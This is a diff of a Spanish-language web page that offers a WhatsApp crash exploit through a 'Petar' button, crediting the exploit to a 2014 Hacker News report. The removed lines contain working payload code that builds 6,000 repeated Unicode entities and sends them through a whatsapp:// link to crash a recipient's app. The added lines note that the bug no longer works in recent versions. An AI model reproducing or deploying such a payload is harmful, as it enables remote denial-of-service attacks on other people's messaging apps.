@@ -191,6 +191,7 @@ body{
 <div id="page">
 <div id="toolBox" style="padding: 40px 0px 40px 0px"> 
     <noscript>Activa javascript para poder usar esta aplicación <br/></noscript>
+    Este bug ya no funciona en las últimas versiones de whatsapp<br /><br />
     Solo utilicelo para probar que funciona<br /><br />
     El xploit no es mio, para más información: <a href="http://thehackernews.com/2014/12/crash-your-friends-whatsapp-remotely_1.html">The Hacker News</a><br /><br />
 </div>
@@ -200,23 +201,11 @@ body{
 <input type="button" style="margin:20px 0px 15px 0px;padding: 20px; font-size: 1.5em; color:red; text-shadow: 0px 0px 4px red" onclick="create()" value="Petar" />
 </div>
 </div>
-<script type="text/javascript" src="scripts/fonts_and_icons3.js"></script>
+<script type="text/javascript" src="scripts/string"></script>
 <script type="text/javascript">
 
 function create(){
-	var txtXplt = "";
-	for(var i = 0; i < 6000; i++) {
-		txtXplt += "&#1f4a9";
-	}
-	document.location = "whatsapp://send?text="+encodeURIComponent(uniDecode(txtXplt));
-}
-
-function uniDecode(str){
-	var text, p=document.createElement('p');
-    p.innerHTML=str;
-    text= p.innerText || p.textContent;
-    p.innerHTML='';
-    return text;	
+	document.location = "whatsapp://send?text="+txtXplt;
 }
 </script>
 </div>
